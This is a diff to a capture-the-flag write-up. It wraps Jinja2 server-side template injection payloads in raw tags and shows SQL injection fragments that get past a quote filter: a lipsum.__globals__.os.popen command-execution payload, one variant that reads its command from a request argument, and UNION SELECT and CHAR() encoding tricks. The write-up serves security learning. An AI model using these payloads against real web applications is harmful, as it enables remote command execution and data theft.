@@ -104,9 +104,11 @@ That's the skeleton. Every flag below is "make this exact chain survive one more
 
 The Easy level has nothing but the quote filter, so the shared chain works as-is. Since quotes are banned inside `keycode` too, we encode the SSTI string with MySQL's `CHAR()` so no literal quotes ever appear:
 
+{% raw %}
 ```jinja2
 {{lipsum.__globals__.os.popen('/readflag').read()}}
 ```
+{% endraw %}
 
 Final inputs:
 
@@ -150,7 +152,7 @@ SUBSTRING_INDEX(SUBSTRING_INDEX(INFO, CHAR(...'operator = (\''...), -1), CHAR(..
 
 The key move: we put the payload into the **operator field** this time, with a trailing `\` to escape the literal, and make the SSTI read its command from a request arg so it stays quote-free:
 
-- **operator**: `{{lipsum.__globals__.os.popen(request.args.rce).read()}}\`
+- **operator**: {% raw %}`{{lipsum.__globals__.os.popen(request.args.rce).read()}}\`{% endraw %}
 - **keycode**:
   ```sql
   ) UNION SELECT <extract operator>, <extract keycode>
